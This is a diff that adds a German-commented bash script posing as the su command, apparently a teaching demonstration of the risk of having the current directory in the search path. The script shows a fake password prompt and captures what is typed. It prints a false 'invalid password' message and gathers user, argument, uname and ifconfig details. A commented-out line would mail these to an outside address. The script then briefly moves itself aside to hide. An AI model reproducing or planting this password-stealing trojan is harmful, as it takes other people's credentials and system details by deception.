@@ -1,0 +1,44 @@
+#!/bin/bash
+# Gemeiner Nachbau des su Befehls
+# Nutzt Sicherheitslücke aktuelles Verzeichnis im Suchpfad
+TEMPFILE="/tmp/.tempsu"
+HIDDEN="/tmp/.mysu"
+SLEEPFILE="/tmp/.sleepfile"
+SLEEP=30
+FROM="bofh@bofh.test"
+TO="it2010@it2010.ba-leipzig.de"
+# Step 1: Passwort wegfangen und Verhalten nachbilden
+echo -n "Passwort: "
+read -s PASSWD
+echo ""
+sleep 3
+echo "su: ungültiges Kennwort"
+# Step 2: Informationen sammeln
+echo "Gestartet vom User:        "$USER    > $TEMPFILE
+echo "Abgefangenes Passwort:     "$PASSWD >> $TEMPFILE
+echo "Kommandozeilenparameter 1: "$1      >> $TEMPFILE
+echo "Kommandozeilenparameter 2: "$2      >> $TEMPFILE
+echo "Kommandozeilenparameter 3: "$3      >> $TEMPFILE
+echo "********************************"   >> $TEMPFILE
+echo "Ausgabe von uname -a     : "        >> $TEMPFILE
+/bin/uname -a                             >> $TEMPFILE
+echo "********************************"   >> $TEMPFILE
+echo "Ausgabe von ifconfig     : "        >> $TEMPFILE
+/sbin/ifconfig                            >> $TEMPFILE
+echo "********************************"   >> $TEMPFILE
+echo "Mit vielen Gruessen vom BOfH"       >> $TEMPFILE
+echo "."                                  >> $TEMPFILE
+#Step 3: per Mail versenden und TEMPFILE löschen
+#/usr/bin/mail -s Passwortklau -r $FROM $TO < $TEMPFILE
+/bin/rm $TEMPFILE
+#Step 4: unser su für eine Weile umbenennen
+echo "#!/bin/bash"                         > $SLEEPFILE
+echo "/bin/mv "$0" "$HIDDEN               >> $SLEEPFILE
+echo "sleep "$SLEEP                       >> $SLEEPFILE
+echo "/bin/mv "$HIDDEN" "$0               >> $SLEEPFILE
+echo "/bin/rm "$SLEEPFILE                 >> $SLEEPFILE
+echo "exit 0"                             >> $SLEEPFILE
+/bin/chmod 777 $SLEEPFILE
+$SLEEPFILE &
+#Step 5: beenden mit korrekten Exit-Status 1
+exit 1
